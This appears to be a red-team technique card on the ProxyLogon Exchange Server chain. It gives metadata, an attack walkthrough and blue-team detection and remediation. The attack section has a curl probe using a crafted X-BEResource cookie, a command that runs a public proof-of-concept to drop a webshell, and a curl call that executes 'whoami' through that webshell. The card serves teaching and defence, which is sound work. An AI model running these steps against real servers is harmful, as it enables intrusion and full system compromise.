# [PE-REMOTE-001]: Exchange Server Vulnerabilities (ProxyLogon Chain)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-REMOTE-001 |
| **MITRE ATT&CK v18.1** | [Exploitation of Remote Services (T1210)](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Initial Access / Privilege Escalation |
| **Platforms** | Windows AD / Exchange |
| **Severity** | **Critical** |
| **CVE** | **CVE-2021-27065** (File Write), **CVE-2021-26855** (SSRF) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The "ProxyLogon" attack chain consists of multiple vulnerabilities. First, an unauthenticated attacker uses an SSRF vulnerability (**CVE-2021-26855**) to bypass authentication and impersonate the Exchange Admin. Once authenticated, the attacker abuses a post-auth arbitrary file write vulnerability (**CVE-2021-27065**) in the `Set-OabVirtualDirectory` cmdlet to write a malicious ASPX webshell to the server's webroot. Since Exchange runs as `NT AUTHORITY\SYSTEM`, executing this webshell grants full system access.
- **Attack Surface:** Exchange Client Access Service (CAS) / OWA (TCP 443).
- **Business Impact:** **Total Server Compromise**. Often leads to Domain Admin via LSASS dumping.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Unauthenticated (Network Access to Port 443).
- **Tools:**
    - [ProxyLogon-PoC](https://github.com/hausec/ProxyLogon)
    - [Metasploit](https://github.com/rapid7/metasploit-framework) (`exploit/windows/http/exchange_proxylogon_rce`)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Vulnerability**
Send a request to the Autodiscover endpoint with a specific cookie.
```bash
curl -i -k https://target.com/autodiscover/autodiscover.xml -H "Cookie: X-BEResource=Admin@target.com:444/ecp/proxyLogon.ecp"
```

**Step 2: Exploit (Python)**
Run the exploit script to drop a webshell.
```bash
python3 proxylogon.py -t 192.168.1.10 -e admin@target.com
```

**Step 3: Interact**
Access the webshell.
```bash
curl -k https://192.168.1.10/owa/auth/shell.aspx -d 'cmd=whoami'
# Output: nt authority\system
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Endpoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Exchange HttpProxy** | `Log` | Requests to `/ecp` or `/owa` containing `X-BEResource` cookie with suspicious values (like `localhost` or `Admin@`). |
| **Sysmon** | 11 | FileCreate in `\HttpProxy\owa\auth\` ending in `.aspx`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patch:** Apply the **March 2021** (or later) Exchange Security Updates immediately.
*   **Webshell Hunt:** Scan all Exchange directories for `.aspx` files created after Feb 2021 that are not signed by Microsoft.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-001]
> **Next Logical Step:** [CA-UNSC-001] (LSASS Dump)
